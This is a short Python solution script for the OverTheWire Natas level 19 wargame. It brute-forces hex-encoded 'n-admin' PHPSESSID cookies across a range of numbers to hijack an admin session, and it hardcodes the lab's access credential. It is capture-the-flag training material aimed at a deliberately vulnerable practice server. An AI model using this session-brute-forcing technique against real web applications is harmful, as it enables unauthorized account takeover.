from requests import get
from codecs import encode

auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
url = 'http://natas19.natas.labs.overthewire.org/index.php'
fail_str = 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.'

for x in range(1, 641):
    phpsess = '{}-admin'.format(x)
    cookies={'PHPSESSID': encode(phpsess.encode('ascii'), 'hex').decode('ascii')}
    r = get(url, auth=auth, cookies=cookies)

    if fail_str not in r.text:
        print(r.text)
        print(x)
        break


